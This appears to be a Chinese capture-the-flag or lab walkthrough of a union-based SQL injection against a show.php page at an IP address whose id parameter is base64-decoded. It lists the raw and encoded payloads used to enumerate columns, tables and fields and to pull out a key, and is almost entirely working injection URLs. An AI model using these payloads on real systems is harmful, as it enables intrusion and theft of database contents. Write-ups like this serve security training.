```
推测后台SQL: select x from x id = 'MQo='
日常检测
http://219.153.49.228:49683/show.php?id=MQo='  //正常页面
http://219.153.49.228:49683/show.php?id=MQo= and 1 = 2  //无数据
    http://219.153.49.228:49683/show.php?id=MQo= order by 10 //无数据
    http://219.153.49.228:49683/show.php?id=MQo= order by 1 //无数据
    猜测后台SQL
    select x from x id = 'MQo= and 1 = 2'
    构建SQL
    http://219.153.49.228:49683/show.php?id=MQo=''--+ //正常页面
    猜测后台过滤掉了单引号
    转义单引号
    http://219.153.49.228:49683/show.php?id=MQo=%27%27 //正常页面
    宽字节尝试
    http://219.153.49.228:49683/show.php?id=MQo=%ee //正常页面

    -----草 推测个JB 这是base64编码过后的，后台应该接受的是base64编码后再解码，所以传到后台的应该是base64编码过后的数据
    -----重新来
日常检测
编码前：http://219.153.49.228:49683/show.php?id=1 and 1=1
编码后：http://219.153.49.228:49683/show.php?id=MSBhbmQgMT0x //正常
编码前：http://219.153.49.228:49683/show.php?id=1 and 1=2
编码后：http://219.153.49.228:49683/show.php?id=MSBhbmQgMT0y //无数据

1.猜解SELECT字段
编码前：http://219.153.49.228:49683/show.php?id=1 order by 2 
编码后：http://219.153.49.228:49683/show.php?id=MSBvcmRlciBieSAy
结果：2

2.查询数据显示位置
编码前：http://219.153.49.228:49683/show.php?id=-1 union select 1,2
编码后：http://219.153.49.228:49683/show.php?id=LTEgdW5pb24gc2VsZWN0IDEsMiA=
结果：1 2

3.查询当前数据库所有表
编码前：http://219.153.49.228:49683/show.php?id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = database()) 
编码后：http://219.153.49.228:49683/show.php?id=LTEgdW5pb24gc2VsZWN0IDEsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYSA9IGRhdGFiYXNlKCkpIA==
结果：data

4.查询指定表的所有字段
编码前：http://219.153.49.228:49683/show.php?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name = 'data') 
编码后：http://219.153.49.228:49683/show.php?id=LTEgdW5pb24gc2VsZWN0IDEsKHNlbGVjdCBncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZSA9ICdkYXRhJykg
结果：id,title,main,thekey

4.查询指定表中的指定字段
编码前：http://219.153.49.228:49683/show.php?id=-1 union select 1,(select group_concat(thekey) from data) 
编码后：http://219.153.49.228:49683/show.php?id=LTEgdW5pb24gc2VsZWN0IDEsKHNlbGVjdCBncm91cF9jb25jYXQodGhla2V5KSBmcm9tIGRhdGEp
结果：mozhe0445ab003578f0372c844cb4811

```